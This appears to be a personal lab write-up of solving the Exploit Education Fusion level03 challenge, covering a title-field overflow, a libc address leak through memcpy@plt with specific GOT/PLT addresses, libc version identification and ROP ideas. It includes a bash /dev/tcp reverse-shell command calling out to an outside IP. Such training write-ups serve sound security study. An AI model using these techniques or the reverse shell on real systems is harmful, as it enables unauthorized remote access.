@@ -1,0 +1,431 @@
+Full disclosure: I cheated a lot here and would have had to go through significantly more effort if I didn't use this as a guide:
+https://blog.lamarranet.com/index.php/exploit-education-fusion-level-03-solution/
+
+Caveats:
+* It relies on the fact that connections are forked from the main process (and therefore they all share the same address space layout, ASLR doesn't change the layout after a fork). This would be more difficult if the main process' layout changed every time.
+
+#######################
+General
+#######################
+Vulnerability Type									Stack
+Position Independent Executable			No
+Read only relocations								No
+Non-Executable stack								Yes
+Non-Executable heap									Yes
+Address Space Layout Randomisation	Yes
+Source Fortification								No
+
+The protections seem to be the same as last time. Maybe return to libc again?
+
+Things to keep in mind:
+* Maybe we can move the application and run it on our own machine and therefore be able to use radare2? --> Nah I don't think so. It's not statically compiled and I don't have the right version of libcrypto
+
+#######################
+Code Analysis
+#######################
+https://blog.lamarranet.com/index.php/exploit-education-fusion-level-03-solution/
+
+* Need to do hashcash to get our request accepted
+* Apparently we can overflow the title field.
+* Apparently there's something with the \u symbol. The program has a logic error and parses/writes more than it should
+* Apparently it closes off writing to the network socket, so we need to make a reverse shell and not just do system('/bin/bash') this time.
+* Apparently it makes a network request with user-controlled contents. So we probably need to listen to that and we can use it for leaking stuff.
+
+
+Hindsight:After debugging a bit, I found out the buffer overflow happens in handle_request and the ret from that can be taken over.
+Btw this challenge would make a good fuzzing target. I'd like to know if fuzzing can find the \\u thing (would just have to remove the hashcash code)
+
+
+#######################
+Normal Use
+#######################
+Let's try to create a script to interact with the thing normally:
+* Do the hash thing
+* Send payload
+* Receive payload in a separate listener
+
+Got the normal use script created. 
+Weird that four "0"s are required. From the source code it seemed like 2: 
+invalid = result[0] | result[1];
+
+#######################
+Creating a Segfault
+#######################
+decode_string is run for both the title and the contents. Let's use title.
+We can write to `title` as much as we want due to the \u bug (It will keep going until input runs out I think)
+
+Confirmed segfault:
+root@fusion:/home/fusion# dmesg -c
+[131447.318304] level03[14623]: segfault at 61616a61 ip 61616a61 sp bfbdbbf0 error 14
+[131472.229416] level03[14628]: segfault at 61616a61 ip 61616a61 sp bfbdbbf0 error 14
+
+
+Converting to ascii and flipping due to little endian:
+```
+echo 61616a61 | xxd -r -p | rev
+ajaa 
+```
+
+Getting index:
+```
+python -c "print('$(pwn cyclic 100)'.index('ajaa'))"                             
+35
+```
+Meaning: we need 35 junk bytes after the \\u
+
+
+Hindsight:After debugging a bit, I found out the buffer overflow happens in handle_request and the ret from that can be taken over.
+Probably should've confirmed the segfault method when we got the segfault...
+
+
+#######################
+Leaking libc address
+#######################
+PIE is disabled, so we know PLT.GOT addresses. So we can execute anything in PLT.GOT.
+The program closes stdin, stdout and stderr which makes things more difficult
+
+So we probably have to leak the address using post_blog_article(). Maybe let's write the address of something (like the main function) to something that gets sent (like gTitle)
+
+Steps:
+* Take over execution and redirect to memcpy@plt
+* Write libc_start_main@got to gTitle
+* Direct execution to post_blog_article()
+
+------------------------
+Getting the memory values we need
+------------------------
+
+We need:
+* memcpy@plt address												0x08048e60
+* libc_start_main@got address 							0x0804bd2c
+* post_blog_article address									0x08049f20 
+* Address of the gTitle global variable			0x0804be04
+
+
+main:
+└─$ objdump -d level03 | grep start_main --after 1
+08048d80 <__libc_start_main@plt>:
+ 8048d80:	ff 25 2c bd 04 08    	jmp    *0x804bd2c
+
+memcpy:
+└─$ objdump -d level03 | grep memcpy --after 1                                   
+08048e60 <memcpy@plt>:
+ 8048e60:	ff 25 64 bd 04 08    	jmp    *0x804bd64
+
+post_blog_article:
+┌──(x90slide㉿kali)-[~/exercises/exploit_education/fusion/level03]
+└─$ objdump -d level03 | grep post_ --after 1 
+08049f20 <post_blog_article>:
+
+gTitle:
+└─$ rabin2 -s level03 | grep gTitle
+127  ---------- 0x0804be00 GLOBAL OBJ    4        gTitle_len
+132  ---------- 0x0804be04 GLOBAL OBJ    4        gTitle
+
+Let's also get gContents
+└─$ rabin2 -s level03 | grep gContents
+69   ---------- 0x0804bdec GLOBAL OBJ    4        gContents_len
+90   ---------- 0x0804bdf4 GLOBAL OBJ    4        gContents
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!!!!Definitely write about rabin2 to leetsheet!!!!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+------------------------
+Day 2, Leaking libc
+------------------------
+Getting a segfault at 804be04, which is the address of gTitle. 
+[140283.709298] level03[15675]: segfault at 804be04 ip 0804be04 sp bfbdbbf8 error 15 in level03[804b000+1000]
+It seems like EIP is being set to 0804be04, which isn't right...
+
+After debugging a bit, I found out the buffer overflow happens in handle_request and the ret from that (at *handle_request+264) can be taken over.
+
+It looks to me like the problem is that what's supposed to be 0x00000004 is some other value. Perhaps unlike the tutorial we're using, we didn't get lucky?
+(gdb) x/5x $esp
+0xbf9c6bbc:	0x08048e60	0x08049f20	0x0804bdf4	0x0804bd2c
+0xbf9c6bcc:	0x00347830
+
+But I ran the script from the tutorial, and that works just fine. So what's different?
+
+OHH CRAP I'M STUPID
+b'0x4' is not the same as b'\x04'....
+
+
+Looks like the address I got back is UWVS, which is `55 57 56 53` in bytes. But that doesn't look right. 
+
+Hindsight: it's the contents of __libc_start_main (backwards)
+```
+(gdb) x/x 0xb7451020
+0xb7451020 <__libc_start_main>:	0x53565755
+```
+
+The tutorial's script gets 0x4d2f50b7, which is a nonexistent function. But if you flip the bytes, then b7502f4d isn't right either, it's an address inside the __pselect function (not even the function start). In the tutorial he didn't have to flip it, either. Something's off.
+
+What's weird is that it doesn't just write 4 bytes, it writes the entire gTitle (or gContents) buffer full.
+
+So OK we're getting closer to the issue. This is after memcpy has supposedly copied over the contents:
+```
+(gdb) p gContents
+$1 = (unsigned char *) 0xb7451020 "UWVS\350:K\017"
+```
+There's the correct address, followed by the string "UWVS....". What does that mean?
+
+```
+(gdb) x/s __libc_start_main
+0xb7451020 <__libc_start_main>:  "UWVS\350:K\017"
+```
+
+Alright so it seems like the UWVS is actually the instructions of __libc_start_main. 
+
+So debugging memcpy, everything seems right, the correct address is in the correct place.
+```
+(gdb) x 0x0804bdf4
+0x804bdf4 <gContents>:	0xb7451020
+```
+
+
+But in the output, that address is dereferenced for some reason, and we're writing out the instructions instead of what we really want - the address. Why? And how do we fix it?
+
+
+!!!!!!!!!!!!!!!!!
+Btw super useful: watch, rwatch, awatch 
+https://stackoverflow.com/questions/58851/can-i-set-a-breakpoint-on-memory-access-in-gdb
+!!!!!!!!!!!!!!!!!!
+
+
+In the final memcpy in post_blog_article+339, you can see that memcpy gets the address of libc_start_main as one of the arguments: 
+```
+(gdb) x/3x $esp
+0xbf9c6b68:	0xb73fc117	0xb7451020	0x00000004
+```
+
+However, isn't this line supposed to set the value of edx to 0x804bdf4? 
+```
+0x0804a059 <+313>:	mov    edx,DWORD PTR ds:0x804bdf4
+```
+
+But no, apparently not:
+```
+(gdb) info reg edx
+edx            0xb7451020	-1220210656
+```
+
+Yeah uhh not sure what's up with that. I thought it would have to look like this for the memory to be dereferenced:
+```
+mov    edx,DWORD PTR ds:[0x804bdf4]
+```
+
+And with radare2, it does show it in a format I expect!
+```
+mov edx, dword [obj.gContents]
+```
+
+I guess GDB has some weird syntax I don't understand? I asked a question about it on the reverse engineering stack overflow.
+
+Try to understand why the fuck it dereferences the address. Like, memcpy is supposed to take an address, right? So why is it dereferencing the gContents address when in the code, it seems to just be the address? Like I don't get it. And how does it work normally? 
+----> oooh wait, I think I get it. So, gContents is a static place in memory, right? If it were an int, then it would contain an integer. But it's not, it's a char array. So that static place in memory contains a pointer to a place in memory where the string is stored. So it makes sense that it would have to dereference the gContents address to get the pointer to the char array. And that pointer is passed to memcpy. Makes sense.
+
+Todo:
+* Figure out a way to copy the pointer instead of the contents. Two ideas:
+	1. Set it to __libc_start_main@plt instead of __libc_start_main@got.plt. Then you'll get those instructions, which I hope should contain the address --> Actually, I don't think that will work, probably it's a symbol instead of a straightforward address. You can look at the instructions to verify, but yeah.
+	2. Write the address of __libc_start_main@got.plt into gContents, and write the address of gContents into gTitle. Maybe that way it will dereference correctly and you'll get what you want.
+	3. Something more sensible?
+
+------------------------
+Day 3
+------------------------
+I think I just verified that method #1 will work for copying the pointer instead of the contents of __libc_start_main! Yay!
+```
+[0x0804938c]> pdf @ sym.imp.__libc_start_main 
+            ; CALL XREF from entry0 @ 0x80493a8
+┌ 6: int sym.imp.__libc_start_main (func main, int argc, char **ubp_av, func init, func fini, func rtld_fini, void *stack_end);
+│ bp: 0 (vars 0, args 0)
+│ sp: 0 (vars 0, args 0)
+│ rg: 0 (vars 0, args 0)
+└           0x08048d80      ff252cbd0408   jmp dword [reloc.__libc_start_main] ; 0x804bd2c
+```
+ff25 is probably the jmp dword ptr instruction and the rest is the address! 
+So we want to copy 4 bytes out of __libc_start_main@plt + 0x2 into gContents or gTitle.
+
+__libc_start_main@plt + 0x2   contains   __libc_start_main@got     contains   the address of __libc_start_main
+																																										^ this is what we will get
+
+
+From GDB, in post_blog_article+339, we can see that it looks promising:
+```
+(gdb) x/x gContents
+0x804bd2c <__libc_start_main@got.plt>:	0xb7451020
+(gdb) x/x 0xb7451020
+0xb7451020 <__libc_start_main>:	0x53565755
+```
+
+Verified that the address gets copied into the post correctly after the memcpy
+```
+(gdb) x/50x $eax - 0x50
+0xb73fc0c7:	0x41414141	0x41414141	0x41414141	0x41414141
+0xb73fc0d7:	0x41414141	0x41414141	0x41414141	0x0000b1bb
+0xb73fc0e7:	0x42424200	0x42424242	0x42424242	0x42424242
+0xb73fc0f7:	0x42424242	0x42424242	0x42424242	0x048e6042
+0xb73fc107:	0x049f2008	0x04bdf408	0x048d8208	0x0a0d0408
+0xb73fc117:	0xb7451020
+							^ here
+```
+
+And also verified that we receive that address in the response. Nice! Just have to parse it out and display it now
+
+And we got the libc address, 0xb7451020!
+
+According to libc database search, there are a bunch of possibilities: https://libc.blukat.me/?q=__libc_start_main%3A0xb7451020
+```
+
+libc6-x32_2.30-0ubuntu2.2_amd64
+libc6-x32_2.30-0ubuntu2.2_i386
+libc6-x32_2.30-0ubuntu2_amd64
+libc6-x32_2.30-0ubuntu2_i386
+libc6_2.13-20ubuntu5.2_i386
+libc6_2.13-20ubuntu5.3_i386
+libc6_2.13-20ubuntu5_i386
+```
+
+Let's get a second address and find an exact match. For example, the address of memcpy.
+
+Problem: using the memcpy method, we can't do it at the same time. We only wrote one byte as the amount of stuff that needs to get written (0x04) and we depended on the area being filled with zeroes for the rest. If we write anything else, we screw the memcpy up.
+Solution: Let's do it separately then, since the process is forked and the ASLR stays the same each time we make a new request. But that kind of sucks.
+
+Found more addresses:
+	__libc_start_main:	0xb7451020
+	memcpy: 						0xb7551fe0
+
+Based on the above two, the database search found nothing... Weird.
+Looked at the addresses in gdb and it's because we have the wrong address somehow:
+```
+(gdb) x/x memcpy
+0xb74afa60 <memcpy>:	0x60fde853
+(gdb) x/x 0xb7551fe0
+0xb7551fe0 <__memcpy_ssse3_rep>:	0x244c8b53
+```
+Maybe memcpy isn't the best candidate? idk
+
+Found the version with these:
+	__libc_start_main:	0xb7451020
+	__asprintf_chk: 		0xb751f260
+
+The libc version is:
+libc6_2.13-20ubuntu5_i386 
+
+Confirmed it:
+```
+root@fusion:/opt/fusion/bin# ldd --version
+ldd (Ubuntu EGLIBC 2.13-20ubuntu5) 2.13
+```
+
+#######################
+Exploitation
+#######################
+We have the libc version. Now we can actually exploit it.
+
+We're getting to the system call, but gContents doesn't contain our payload for some reason
+
+Aaah, gContents contains a pointer to our payload. Makes sense, same problem as we had before.
+```
+(gdb) x/x 0x804bdf4
+0x804bdf4 <gContents>:	0x0951c698
+(gdb) x/s 0x804bdf4
+0x804bdf4 <gContents>:	 "\230\306Q\t\b\260Q\tp\306Q\t\254"
+(gdb) x/s 0x0951c698
+0x951c698:	 "/bin/bash -i >& /dev/tcp/192.168.6.1/8001 0>&1"
+```
+
+Maybe we need to create a ROP chain to:
+1. Pop gContents address into a register
+2. dereference that register and write the value somewhere (like to another register or pushed onto the stack)
+2b. Maybe the third step would be easier if ebp was equal to esp. Then a mov register, ebp-0x... gadget would do the job
+3. Push the dereferenced value onto the stack to the appropriate location
+
+Idk, that sounds tedious and potentially difficult to find the correct ROP gadgets. Anything simpler?
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Interesting stuff here:
+https://trustfoundry.net/basic-rop-techniques-and-tricks/
+* write-what-where
+* stack pivoting
+* xor and xchg
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+Maybe make use of a write-what-where primitive:
+1. Pop gContents address into a register # pop eax
+2. Dereference gContents to get the address of the string # mov ebx, [eax]
+3. Dereference the register to get the first four bytes of the string # mov ecx, [ebx]
+4. Pop the address of a writable memory region (like GOT) into a register # pop edx
+5. Move the first four bytes of the string to the writable memory region  # mov [edx], ecx
+
+Then just repeat this to get all the bytes written. It's a lot of steps, but all the steps should be simple and reliable.
+
+What is a place with a static address where we can write our payload?
+```
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
+  INTERP         0x000134 0x08048134 0x08048134 0x00013 0x00013 R   0x1
+      [Requesting program interpreter: /lib/ld-linux.so.2]
+  LOAD           0x000000 0x08048000 0x08048000 0x02bb4 0x02bb4 R E 0x1000
+  LOAD           0x002bb4 0x0804bbb4 0x0804bbb4 0x00208 0x0025c RW  0x1000
+  DYNAMIC        0x002bd0 0x0804bbd0 0x0804bbd0 0x000f0 0x000f0 RW  0x4
+  NOTE           0x000148 0x08048148 0x08048148 0x00044 0x00044 R   0x4
+  GNU_EH_FRAME   0x002858 0x0804a858 0x0804a858 0x00094 0x00094 R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
+```
+
+Idk, maybe 0x0804bbb4? Looks like it's large enough. But ahh I can't find suitable mov gadgets. This is getting complicated again
+
+Though... Maybe we can just leak the address of gContents just like we leaked the address of libc_start_main? --> Yeah I think so
+
+I searched for bytes in radare2:
+```
+[0x0804938c]> / \xf4\xbd\x04\x08
+Searching 4 bytes in [0x804bdbc-0x804be10]
+hits: 0
+Searching 4 bytes in [0x804bbb4-0x804bdbc]
+hits: 0
+Searching 4 bytes in [0x8048000-0x804abb4]
+hits: 3
+Searching 4 bytes in [0x100000-0x1f0000]
+hits: 0
+0x08049ef5 hit0_0 .T$,T$$\u00f4\u00bd\u0004\u0008bt&.
+0x08049f37 hit0_1 .D\u00f4\u00bd\u0004\u00086.
+0x0804a05b hit0_2 .f@\u00f4\u00bd\u0004\u00085$T$.
+```
+
+Looks like there are multiple references to gContents. Confirmed in running process:
+```
+(gdb) x/4x 0x08049ef5
+0x8049ef5 <handle_request+501>:	0xf4	0xbd	0x04	0x08
+```
+
+Leaked address from gContents: 0x74736574
+But looks like that's not the correct one?
+
+Oh fuck, I'm trying to leak the value of gContents, but I'm also overriding that value....
+
+Alright, managed to leak the address with gTitle:
+[*] Parsed out address from response: 0x951c300
+
+TODO: convert to gTitle leak and make sure it works, and add options for leaking different things
+
+Update: Actually, it looks like this doesn't work. It looks like the value of gContents is different every time...
+Update update: but the leak script gives me the same address every time! What gives?
+Update update update: Not sure why the addresses are sometimes the same and sometimes differrent (maybe due to length differences?), but I think the gContents location contained a bad character, which is why the exploit broke
+
+Idea: Maybe we can try to fit the payload at the start of gTitle
+
+
+(gdb) x/x 0x0804be04
+0x804be04 <gTitle>:	0x0951c670
+
+Confirmed that the value stays the same always
+
+YES! GOT THE SHELL!!!
+Let's clean everything up and connect it together and stuff
+
+
